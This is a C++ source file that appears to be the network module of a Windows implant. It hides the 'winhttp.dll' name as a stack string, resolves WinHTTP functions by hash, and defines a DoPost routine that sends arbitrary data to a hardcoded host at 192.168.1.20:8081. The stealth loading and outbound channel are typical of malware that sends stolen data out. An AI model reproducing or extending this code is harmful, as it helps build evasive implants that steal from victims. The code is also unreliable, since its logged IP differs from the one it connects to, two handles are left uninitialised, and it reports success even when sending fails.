#include "../../includes/core/core.h" 
#include "../../includes/net/net.h"
#include "../../includes/api/api.h"




BOOL NetMgr::Init() {
    DEBUG_LOGA("[+] Network Manager init");

    CHAR dll[12];
    dll[0] = 'w';
    dll[1] = 'i';
    dll[2] = 'n';
    dll[3] = 'h';
    dll[4] = 't';
    dll[5] = 't';
    dll[6] = 'p';
    dll[7] = '.';
    dll[8] = 'd';
    dll[9] = 'l';
    dll[10] = 'l';
    dll[11] = '\0';

    this->WinHttp = hollow->Win32.LoadLibraryA(dll);
    if (!this->WinHttp) { return FALSE; }

    this->httpApis = (WINHTTP*)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(WINHTTP));
    if (!this->httpApis) { return FALSE; }

    hollow->Modules.winhttp = this->WinHttp;

    if (this->httpApis) {
        this->httpApis->WinHttpOpen = (decltype(this->httpApis->WinHttpOpen))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpOpen);
        this->httpApis->WinHttpConnect = (decltype(this->httpApis->WinHttpConnect))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpConnect);
        this->httpApis->WinHttpCloseHandle = (decltype(this->httpApis->WinHttpCloseHandle))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpCloseHandle);
        this->httpApis->WinHttpOpenRequest = (decltype(this->httpApis->WinHttpOpenRequest))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpOpenRequest);
        this->httpApis->WinHttpSendRequest = (decltype(this->httpApis->WinHttpSendRequest))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpSendRequest);
        this->httpApis->WinHttpReceiveResponse = (decltype(this->httpApis->WinHttpReceiveResponse))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpReceiveResponse);
        this->httpApis->WinHttpQueryDataAvailable = (decltype(this->httpApis->WinHttpQueryDataAvailable))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpQueryDataAvailable);
        this->httpApis->WinHttpQueryHeaders = (decltype(this->httpApis->WinHttpQueryHeaders))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpQueryHeaders);
        this->httpApis->WinHttpReadData = (decltype(this->httpApis->WinHttpReadData))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpReadData);
        this->httpApis->WinHttpSetOption = (decltype(this->httpApis->WinHttpSetOption))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpSetOption);
        this->httpApis->WinHttpAddRequestHeaders = (decltype(this->httpApis->WinHttpAddRequestHeaders))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpAddRequestHeaders);
        this->httpApis->WinHttpGetIEProxyConfigForCurrentUser = (decltype(this->httpApis->WinHttpGetIEProxyConfigForCurrentUser))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpGetIEProxyConfigForCurrentUser);
        this->httpApis->WinHttpGetProxyForUrl = (decltype(this->httpApis->WinHttpGetProxyForUrl))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpGetProxyForUrl);
        this->httpApis->WinHttpDetectAutoProxyConfigUrl = (decltype(this->httpApis->WinHttpDetectAutoProxyConfigUrl))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpDetectAutoProxyConfigUrl);
        this->httpApis->WinHttpGetDefaultProxyConfiguration = (decltype(this->httpApis->WinHttpGetDefaultProxyConfiguration))api::GetProcAddress(this->WinHttp, api::hashs::winhttp::WinHttpGetDefaultProxyConfiguration);
        DEBUG_LOGA("[*] Loaded winhttps apis");

    }

    return TRUE;

}



BOOL NetMgr::DoPost(PBYTE data, SIZE_T len) {

    HINTERNET hSession, hConnect, hRequest = NULL;
    DEBUG_LOGA("[+] Posting to http://192.168.1.18:8081/test");

    hSession = this->httpApis->WinHttpOpen(NULL,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        goto CLEANUP;

    hConnect = this->httpApis->WinHttpConnect(hSession, L"192.168.1.20", 8081, 0);
    if (!hConnect)
        goto CLEANUP;
    hRequest = this->httpApis->WinHttpOpenRequest(hConnect, L"POST", L"/test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest)
        goto CLEANUP;

    if (!this->httpApis->WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)data, len, len, 0)) {
        DEBUG_LOGA("[!]Failed Sending Request: %d\n", GetLastError());
        goto CLEANUP;
    }

CLEANUP:
    if (hRequest) { this->httpApis->WinHttpCloseHandle(hRequest); }
    if (hConnect) { this->httpApis->WinHttpCloseHandle(hConnect); }
    if (hSession) { this->httpApis->WinHttpCloseHandle(hSession); }

    return TRUE;
}


NetMgr* g_NetMgr = NULL;
